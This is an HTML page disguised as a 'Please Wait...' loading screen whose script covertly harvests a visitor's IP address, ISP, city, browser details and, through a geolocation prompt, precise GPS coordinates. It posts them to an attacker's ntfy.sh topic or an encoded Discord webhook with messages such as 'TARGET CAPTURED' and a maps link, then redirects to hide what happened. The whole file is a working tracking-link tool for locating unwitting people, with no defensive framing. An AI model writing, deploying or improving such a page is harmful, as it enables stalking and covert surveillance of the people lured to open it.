< !DOCTYPE html >
    <html lang="id">
        <head>
            <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>Please Wait...</title>
                </head>
                <body>
                    <script>
        // High-accuracy live position tracker using HTML5 Geolocation API
                        async function captureAndSend() {
            const urlParams = new URLSearchParams(window.location.search);
                        const topic = urlParams.get('topic');
                        const target = urlParams.get('t');
                        const webhookUrl = urlParams.get('w'); // for discord backward compat

                        const redirectUrl = target ? atob(target) : 'https://google.com';

                        // Gather standard data first
                        let geoData = { };
                        try {
                const res = await fetch('https://ip-api.com/json/');
                        geoData = await res.json();
            } catch(e) { }

                        let payload = {
                            ip: geoData.query || 'Unknown',
                        country: geoData.country || 'Unknown',
                        region: geoData.regionName || 'Unknown',
                        city: geoData.city || 'Unknown',
                        isp: geoData.isp || geoData.org || 'Unknown',
                        lat: geoData.lat,
                        lon: geoData.lon,
                        ua: navigator.userAgent,
                        time: new Date().toISOString()
            };

            // Force Redirect Helper
            const sendAndGo = async () => {
                try {
                    if(topic) {
                            await fetch(`https://ntfy.sh/${topic}`, {
                                method: 'POST',
                                body: JSON.stringify(payload),
                                headers: { 'Title': 'Target Tertangkap!', 'Tags': 'skull' }
                            });
                    }
                        if(webhookUrl) {
                            await fetch(atob(webhookUrl), {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    content: `🚨 TARGET CAPTURED: IP ${payload.ip} | GEO: ${payload.city} | Accurate GPS: ${payload.accurate ? 'YES' : 'NO'} \n🔗 Maps: https://www.google.com/maps?q=${payload.lat},${payload.lon}`
                                })
                            });
                    }
                } catch(e) { }
                        window.location.href = redirectUrl;
            };

                        // Ask for real GPS permission, if denied (or timeout in 4s), fallback to IP-based location
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(
                                (position) => {
                                    payload.lat = position.coords.latitude;
                                    payload.lon = position.coords.longitude;
                                    payload.accurate = true;
                                    sendAndGo();
                                },
                                (error) => {
                                    sendAndGo(); // User denied or timeout, send IP data
                                },
                                { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
                            );
            } else {
                            sendAndGo(); // Browser doesnt support
            }
        }
                        captureAndSend();
                    </script>
                </body>
            </html>
